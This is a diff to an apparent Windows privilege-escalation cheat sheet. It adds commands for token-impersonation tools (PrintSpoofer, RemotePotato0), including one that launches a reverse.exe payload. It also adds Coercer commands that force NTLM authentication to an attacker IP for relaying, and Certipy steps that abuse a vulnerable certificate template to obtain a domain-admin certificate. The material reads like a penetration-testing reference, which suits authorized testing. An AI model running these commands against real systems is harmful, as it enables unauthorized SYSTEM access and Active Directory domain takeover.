@@ -108,8 +108,15 @@ powershell -ep bypass ". .\PowerUp.ps1; Invoke-AllChecks | Out-File -FilePath po
 whoami /priv | findstr "SeImpersonate"
 
 # PrintSpoofer (Windows 10/Server 2019+, requires SeImpersonatePrivilege)
-.\PrintSpoofer64.exe -i -c "cmd.exe"
-.\PrintSpoofer64.exe -c "C:\Windows\Temp\reverse.exe"
+# Token impersonation via Print Spooler Service
+.\PrintSpoofer.exe -i -c cmd.exe
+.\PrintSpoofer.exe -i -c "C:\Windows\Temp\reverse.exe"
+.\PrintSpoofer.exe -i -c powershell.exe
+
+# RemotePotato0 (cross-session NTLM capture)
+# Captures NTLM from high-priv session and impersonates
+.\RemotePotato0.exe -m 2 -s <target_session_id>
+# Requires System token in current session; relays captured NTLM for SYSTEM escalation
 
 # GodPotato (Windows Server 2012 - 2022, Windows 8 - 11)
 .\GodPotato-NET4.exe -cmd "cmd /c whoami > C:\Windows\Temp\whoami.txt"
@@ -120,6 +127,19 @@ whoami /priv | findstr "SeImpersonate"
 
 # SweetPotato
 .\SweetPotato.exe -a "whoami"
+```
+
+```bash
+# === NTLM RELAY AND COERCION ===
+
+# Coercer — force NTLM authentication from target
+coercer coerce -l <attacker_ip> -t <target_ip>
+coercer coerce -l <attacker_ip> -t <target_ip> -v  # verbose
+
+# Supported methods: PrinterBug, PetitPotam, ShadowCoerce, WebDAV, DFSCoerce, Beacon
+
+# Listen for incoming NTLM (with Responder or ntlmrelayx)
+# Then relay NTLM to target service (e.g., LDAP, SMB) for privilege escalation
 ```
 
 ```bash
@@ -225,6 +245,28 @@ icacls "C:\Path\To\Task\Binary.exe"
 # Autoruns
 reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
 reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+```
+
+```powershell
+# === AD CS / CERTIFICATE ESCALATION ===
+
+# Certipy — Active Directory Certificate Services enumeration and exploitation
+# Enumerate certificate templates and paths to privilege escalation
+certipy find -u <user>@<domain> -p <password> -dc-ip <domain_controller_ip>
+certipy find -u <user>@<domain> -p <password> -dc-ip <dc_ip> -output <output_file>
+
+# Request certificate for escalation (example: template allows impersonation)
+certipy req -u <user>@<domain> -p <password> -ca <ca_name> -template <template_name> -dc-ip <dc_ip>
+
+# Request certificate as domain admin (if vulnerable template allows)
+certipy req -u <user>@<domain> -p <password> -ca <ca_name> -template <vuln_template> \
+  -alt-name <domain_admin>@<domain> -dc-ip <dc_ip>
+
+# Fetch certificate from CA
+certipy cert -pfx <cert.pfx> -pfx-pass <password> -out <output>
+
+# Use certificate for authentication (pass-the-cert)
+# Then escalate via authenticated LDAP, Kerberos, or local system operations
 ```
 
 ---
